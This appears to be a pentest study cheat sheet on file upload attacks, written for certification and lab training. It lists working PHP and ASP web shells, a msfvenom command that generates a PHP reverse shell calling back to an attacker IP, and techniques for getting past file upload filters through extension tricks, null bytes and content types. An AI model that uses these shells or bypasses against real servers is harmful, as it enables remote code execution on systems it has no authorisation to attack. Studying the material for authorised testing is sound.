# File Upload Attacks  

>[Burp Suite Certified Practitioner study notes on file upload bypass](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#file-uploads)  

## Web Shells

| **Web Shell**   | **Description**   |
| --------------|-------------------|
| `<?php file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
| `<?php echo file_get_contents('/etc/hostname'); ?>` | PHP script that executes to get the (hostname) on the back-end server [Arbitrary File Upload](https://academy.hackthebox.com/module/136/section/1260) |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |
| `<?php echo shell_exec($_GET[ "cmd" ]); ?>` | Alternative PHP Webshell using shell_exec function. |
| `<% eval request('cmd') %>` | Basic ASP Web Shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
| `/usr/share/seclists/Web-Shells` | List of webshells for frameworks such as: CFM,FuzzDB,JSP,Laudanum, Magento, PHP, Vtiger and WordPress. |
| [PHP Web Shell](https://github.com/Arrexel/phpbash) | PHP Web Shell |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP Reverse Shell |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

## Bypasses

| **Command**   | **Description**   |
| --------------|-------------------|
| **Client-Side Bypass** | [Bypass the client-side file type validations](https://academy.hackthebox.com/module/136/section/1280) |
| `[CTRL+SHIFT+C]` | Toggle Page Inspector |
| **Blacklist Bypass** | [Blacklist Filters](https://academy.hackthebox.com/module/136/section/1288) Use Burp Suite intruder to upload a single file name with list possible extensions. Then use intruder again to perform GET request on all the files upload to identify PHP execution on target. |
| `shell.phtml` | Uncommon Extension |
| `shell.pHp` | Case Manipulation |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) | List of ASP Extensions |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) | List of Web Extensions |
| **Whitelist Bypass** | [Whitelisting Extensions](https://academy.hackthebox.com/module/136/section/1289) |
| `shell.jpg.php` | Double Extension bypass example|
| `shell.php.jpg` | Reverse Double Extension |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…` | Character Injection - Before/After Extension |
| **Content/Type Bypass** |
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) | List of Web Content-Types |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | List of File Signatures/Magic Bytes |

>Client side html code alter to allow file upload validation bypass by removing `validate()`, optional clearing the `onchange` and `accept` values.  

![uploads-client-side-html](/images/uploads-client-side-html.png)  


## Limited Uploads

| **Potential Attack**   | **File Types** |
| --------------|-------------------|
| `XSS` | HTML, JS, SVG, GIF |
| `XXE`/`SSRF` | XML, SVG, PDF, PPT, DOC |
| `DoS` | ZIP, JPG, PNG |